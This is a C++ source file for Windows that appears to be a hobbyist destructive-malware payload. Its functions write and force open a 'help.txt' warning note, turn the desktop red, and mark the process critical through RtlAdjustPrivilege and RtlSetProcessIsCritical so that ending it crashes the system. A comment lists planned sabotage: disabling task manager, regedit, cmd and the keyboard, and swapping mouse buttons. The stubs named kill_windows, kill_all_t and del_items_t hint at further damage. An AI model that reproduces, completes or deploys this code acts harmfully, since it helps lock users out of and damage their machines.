#include "_main.h"

typedef NTSTATUS(WINAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(WINAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);

void main::note() {
	HANDLE file = CreateFile(
		L"help.txt",
		GENERIC_WRITE,
		NULL, NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (file == INVALID_HANDLE_VALUE) {
		main::kill_windows();
		return;
	}

	DWORD written = NULL;
	BOOL wrote = WriteFile(
		file,
		main::WARNING_NOTE,
		wcslen(main::WARNING_NOTE) * sizeof(wchar_t),
		&written,
		NULL
	);

	if (!wrote) {
		main::kill_windows();
		return;
	}

	CloseHandle(file);

	HINSTANCE result = ShellExecute(
		NULL,
		L"open",
		L"notepad",
		L"help.txt",
		NULL,
		SW_SHOWNORMAL 
	);

	if ((INT_PTR)result <= 32) {
		main::kill_windows();
		return;
	}

	Sleep(450);

	HWND note = FindWindow(
		NULL,
		L"help.txt - Notepad"
	);

	if (!note) {
		main::kill_windows();
		return;
	}

	ShowWindow(note, SW_MAXIMIZE);
	SetForegroundWindow(note);
}

void main::wallpaper() {
	SystemParametersInfoA(
		SPI_SETDESKWALLPAPER,
		NULL,
		(PVOID)"",
		SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE
	);

	DWORD color = RGB(255, 0, 0);
	SetSysColors(1, new int[1] { COLOR_DESKTOP }, &color);
}

void main::reg_keys() {
	/*
		disable task mgr
		disable regedit
		disable cmd
		disable keyboard scancode map
		swap mouse buttons
		disable shutdown without login
	*/
}

void main::critical() { // skidding speedrun
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(
		ntdll,
		"RtlAdjustPrivilege"
	);

	pRtlSetProcessIsCritical RtlSetProcessIsCritical = (pRtlSetProcessIsCritical)GetProcAddress(
		ntdll,
		"RtlSetProcessIsCritical"
	);

	if (!RtlAdjustPrivilege || !RtlSetProcessIsCritical) {
		main::kill_windows();
		return;
	}

	BOOLEAN enabled;
	NTSTATUS status = RtlAdjustPrivilege(20, TRUE, FALSE, &enabled);

	if (status != 0) {
		main::kill_windows();
		return;
	}

	BOOLEAN old;
	status = RtlSetProcessIsCritical(TRUE, &old, FALSE);

	if (status != 0) {
		main::kill_windows();
		return;
	}
}

void main::kill_windows() {

}



void main::kill_all_t() {

}

void main::del_items_t() {

}

void main::beep_t() {

}